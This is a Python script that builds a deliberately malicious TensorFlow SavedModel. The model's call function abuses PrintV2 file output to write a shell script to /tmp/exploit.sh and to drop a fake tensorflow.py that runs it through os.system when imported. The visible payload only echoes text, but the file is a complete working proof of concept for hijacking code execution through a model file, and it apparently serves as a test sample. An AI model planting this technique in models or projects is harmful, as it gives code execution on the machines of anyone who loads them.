import tensorflow as tf
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.framework import tensor_spec

class tmpclass(DatasetSource):
    def __init__(self, variant_tensor):
        super(tmpclass, self).__init__(variant_tensor)
    
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.string)
    
class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
        self.v = tf.Variable([1, 2, 3], dtype=tf.int8)
        self.exploit_payload = "\n\nimport os as my_os\nmy_os.system('echo hacker')\nmy_os.system('sh /tmp/exploit.sh')"
        

    @tf.function
    def __call__(self, x):
        tf.raw_ops.PrintV2(input="echo 'this is malicious shell code'", output_stream="file:///tmp/exploit.sh")
        tf.raw_ops.PrintV2(input=self.exploit_payload, output_stream="file://./tensorflow.py")
        return self.a * x + self.b

# malicious Tensorflow model serialization
model = SimpleLinearModel()
result = model(tf.constant(5.0))
save_dir = 'model/ExecuteByInject/saved_model'
tf.saved_model.save(model,save_dir)